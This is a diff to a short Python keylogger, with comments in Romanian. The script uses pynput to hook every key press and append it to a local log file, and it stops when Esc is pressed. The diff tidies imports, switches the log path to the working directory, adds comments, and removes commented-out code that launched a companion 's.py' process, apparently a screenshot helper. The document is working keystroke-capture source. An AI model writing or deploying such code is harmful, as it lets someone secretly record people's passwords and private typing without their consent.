@@ -1,6 +1,6 @@
-from pynput.keyboard import Key, Listener
-import subprocess
 import os
+
+from pynput.keyboard import Key, Listener
 
 
 def on_press(key):
@@ -9,9 +9,10 @@ def on_press(key):
 
 
 def write_key_to_file(key):
-    global path
-    with open(path + "\\ss\\log.txt", "a") as f:
+    # Prelucrarea datelor si salvarea in fisier
+    with open(os.getcwd() + "\\ss\\log.txt", "a") as f:
         k = str(key).replace("'", "")
+        # Configurabil
         if k == "Key.space":
             f.write(" ")
         elif k.__contains__("backspace"):
@@ -31,16 +32,11 @@ def write_key_to_file(key):
 
 
 def on_release(key):
+    # Configurabil
+    # Logica pentru finalizarea scriptului 
     if key == Key.esc:
-  #      global ssProcess
- #       ssProcess.kill()
         return False
 
-path = os.getcwd() 
-#path += "\\lib"
-#os.chdir(path)
-#ssProcess = subprocess.Popen(['python', 's.py'])
-#ssProcess = subprocess.Popen(['python', 's.py'], shell = True ) # use shell to have an independent process
-
+# Aplicarea unui listener pentru taste
 with Listener(on_press=on_press, on_release=on_release) as listener: 
      listener.join()
